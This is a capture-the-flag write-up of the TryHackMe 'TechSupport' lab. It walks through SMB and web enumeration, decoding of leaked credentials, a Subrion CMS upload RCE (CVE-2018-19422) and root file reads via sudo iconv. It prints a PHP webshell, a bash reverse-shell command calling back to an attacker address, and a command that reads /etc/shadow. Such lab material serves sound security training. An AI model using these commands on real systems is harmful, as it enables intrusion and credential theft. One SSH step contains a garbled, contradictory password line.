# 🖥️ TryHackMe — TechSupport Writeup

![Room](https://img.shields.io/badge/TryHackMe-TechSupport-red?style=for-the-badge&logo=tryhackme)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge&logo=linux)
![Status](https://img.shields.io/badge/Status-Pwned%20✓-brightgreen?style=for-the-badge)

> **A complete walkthrough of the TechSupport room on TryHackMe.**  
> Covers enumeration → SMB exploitation → Subrion CMS RCE → Privilege Escalation to root via `iconv`.

---

## 📋 Table of Contents

- [Room Overview](#-room-overview)
- [Attack Path Summary](#-attack-path-summary)
- [Step 1 — Nmap Enumeration](#step-1--nmap-enumeration)
- [Step 2 — Web Enumeration (Gobuster)](#step-2--web-enumeration-gobuster)
- [Step 3 — SMB Enumeration](#step-3--smb-enumeration)
- [Step 4 — Decoding Credentials](#step-4--decoding-credentials)
- [Step 5 — Subrion CMS RCE (CVE-2018-19422)](#step-5--subrion-cms-rce-cve-2018-19422)
- [Step 6 — Shell Stabilization](#step-6--shell-stabilization)
- [Step 7 — Lateral Movement to scamsite](#step-7--lateral-movement-to-scamsite)
- [Step 8 — Privilege Escalation to Root](#step-8--privilege-escalation-to-root)
- [Flags](#-flags)
- [Tools Used](#-tools-used)
- [Key Takeaways](#-key-takeaways)

---

## 🏠 Room Overview

| Field | Details |
|-------|---------|
| **Room Name** | TechSupport |
| **Platform** | TryHackMe |
| **IP Address** | 10.64.155.75 |
| **OS** | Ubuntu 16.04.7 LTS |
| **Difficulty** | Easy |
| **Attack Vector** | SMB → Subrion CMS RCE → iconv privesc |

The room simulates a tech support scam website hosted on a Linux server. The `/test/` page contains a fake Windows Defender popup designed to scare victims into calling a fraudulent support number.

---

## 🗺️ Attack Path Summary

```
Nmap Scan
    └─► Open ports: 22 (SSH), 80 (HTTP), 139/445 (SMB)
            │
            ▼
SMB Enumeration (smbclient / enum4linux)
    └─► Share: websvr (guest readable)
    └─► Found: enter.txt with Subrion creds (encoded) + hint about /subrion
    └─► Found: system user "scamsite"
            │
            ▼
Gobuster on HTTP
    └─► /wordpress, /subrion, /test, phpinfo.php
            │
            ▼
Decode Subrion Password (ROT47 / CyberChef Magic)
    └─► admin : Scam2021
            │
            ▼
Subrion Panel Login → File Upload RCE (CVE-2018-19422)
    └─► Upload shell.phar → www-data shell
            │
            ▼
Read wp-config.php
    └─► DB_PASSWORD: ImAScammerLOL!123!
            │
            ▼
SSH as scamsite (password: Scam2021)
    └─► sudo -l → /usr/bin/iconv NOPASSWD
            │
            ▼
ROOT via iconv GTFOBins
    └─► sudo iconv -f 8859_1 -t 8859_1 /root/root.txt ✓
```

---

## Step 1 — Nmap Enumeration

### Command
```bash
nmap -sC -sV 10.64.155.75
```

### Results

```
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
80/tcp   open     http        Apache httpd 2.4.18 (Ubuntu)
139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X
445/tcp  open     netbios-ssn Samba smbd 4.3.11-Ubuntu
8254/tcp filtered unknown
```

### Key Findings
- **SSH (22)** — OpenSSH 7.2p2, old version
- **HTTP (80)** — Apache 2.4.18 showing default page
- **SMB (139/445)** — Samba 4.3.11, **guest auth enabled**, message signing disabled
- **Hostname** — `TECHSUPPORT` (thematic hint)

> ⚠️ SMB with guest authentication is the most critical finding here — it's our entry point.

---

## Step 2 — Web Enumeration (Gobuster)

### Command
```bash
gobuster dir -u http://10.64.155.75 \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt
```

### Results

| Path | Status | Notes |
|------|--------|-------|
| `/index.html` | 200 | Apache default page |
| `/phpinfo.php` | 200 | PHP info page — reveals server config |
| `/test/` | 301 | **Tech support scam page** |
| `/wordpress/` | 301 | **WordPress installation** |

### The /test/ Page

Browsing to `http://10.64.155.75/test/` reveals a **fake Microsoft security warning page** — a tech support scam popup claiming the PC is infected and prompting victims to call a fraudulent toll-free number. This is the theme of the entire room.

---

## Step 3 — SMB Enumeration

### List Shares
```bash
smbclient -L //10.64.155.75 -N
```

```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
websvr          Disk
IPC$            IPC       IPC Service
```

### Access the websvr Share
```bash
smbclient //10.64.155.75/websvr -N
smb: \> ls
smb: \> get enter.txt
```

### Contents of enter.txt

```
GOALS
=====
1) Make fake popup and host it online on Digital Ocean server
2) Fix subrion site, /subrion doesn't work, edit from panel
3) Edit wordpress website

IMP
===
Subrion creds
|-> admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]

Wordpress creds
|->
```

### enum4linux — System User Discovered
```bash
enum4linux -a 10.64.155.75
```

Critical finding:
```
S-1-22-1-1000 Unix User\scamsite (Local User)
```

> 🎯 We now have: a Subrion admin username, an encoded password, paths to check, and a system username `scamsite`.

---

## Step 4 — Decoding Credentials

The password `7sKvntXdPEJaxazce9PXi24zaFrLiKWCk` is described as "cooked with magical formula."

- `hash-identifier` → Not Found  
- `base64 -d` → Invalid input  
- **CyberChef Magic** → Detected as **ROT47**

### Decoded Result
```
admin : Scam2021
```

Navigate to: `http://10.64.155.75/subrion/panel/`  
Login with `admin : Scam2021` ✅

---

## Step 5 — Subrion CMS RCE (CVE-2018-19422)

Subrion CMS 4.2.1 has an authenticated file upload vulnerability. The application blocks `.php` uploads but allows `.phar` files, which PHP still executes.

### Create the Webshell
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.phar
```

### Upload
In the Subrion panel:
```
Content → Uploads → Upload shell.phar
```

### Test RCE
```bash
curl "http://10.64.155.75/subrion/uploads/shell.phar?cmd=id"
# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Get Reverse Shell

Start listener on Kali:
```bash
nc -lvnp 4444
```

Trigger reverse shell:
```bash
curl "http://10.64.155.75/subrion/uploads/shell.phar?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/YOUR_IP/4444+0>%261'"
```

**Result:** `www-data` shell received ✅

---

## Step 6 — Shell Stabilization

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Press Ctrl+Z
stty raw -echo; fg
```

Now we have a fully interactive TTY shell.

---

## Step 7 — Lateral Movement to scamsite

### Read WordPress Config
```bash
cat /var/www/html/wordpress/wp-config.php
```

Found:
```php
define( 'DB_USER',     'support' );
define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );
```

### SSH as scamsite

The DB password didn't work for `su scamsite`, but SSH did with the Subrion password:

```bash
ssh scamsite@10.64.155.75
# Password: Scam2021"This is wrong passwrod"
# Think like hacker 
# Hint : "use all password you gathered"
```

**Result:** SSH login successful as `scamsite` ✅

---

## Step 8 — Privilege Escalation to Root

### Check Sudo Privileges
```bash
sudo -l
```

```
User scamsite may run the following commands on TechSupport:
    (ALL) NOPASSWD: /usr/bin/iconv
```

### GTFOBins — iconv

`iconv` is a character encoding converter. When run as sudo, it can **read any file on the system** as root.

```bash
sudo iconv -f 8859_1 -t 8859_1 /root/root.txt
```

**Root flag captured** ✅

> You can also read `/etc/shadow` to extract all password hashes:
> ```bash
> sudo iconv -f 8859_1 -t 8859_1 /etc/shadow
> ```

---

## 🚩 Flags

| Flag | Location | Method |
|------|----------|--------|
| `root.txt` | `/root/root.txt` | `sudo iconv` read as root |

---

## 🛠️ Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning and service enumeration |
| `gobuster` | Web directory brute forcing |
| `smbclient` | SMB share access |
| `enum4linux` | SMB/LDAP enumeration |
| `CyberChef` | Password decoding (ROT47) |
| `curl` | Testing RCE via webshell |
| `netcat` | Reverse shell listener |
| `iconv` | GTFOBins privilege escalation |

---

## 💡 Key Takeaways

1. **SMB guest access** is a serious misconfiguration — always check it during enumeration
2. **Password reuse** is common in CTFs and real life — try found credentials everywhere
3. **Subrion CVE-2018-19422** — `.phar` extension bypass for authenticated RCE
4. **Config files** (`wp-config.php`) often contain reused credentials
5. **GTFOBins** — always check `sudo -l`; even seemingly harmless binaries like `iconv` can lead to full root

---

## 📚 References

- [GTFOBins — iconv](https://gtfobins.github.io/gtfobins/iconv/)
- [CVE-2018-19422 — Subrion File Upload RCE](https://www.exploit-db.com/exploits/45908)
- [CyberChef](https://gchq.github.io/CyberChef/)
- [TryHackMe — TechSupport Room](https://tryhackme.com/room/techsupp0rt1)

---

*Writeup by **shiva** | TryHackMe | April 2026*
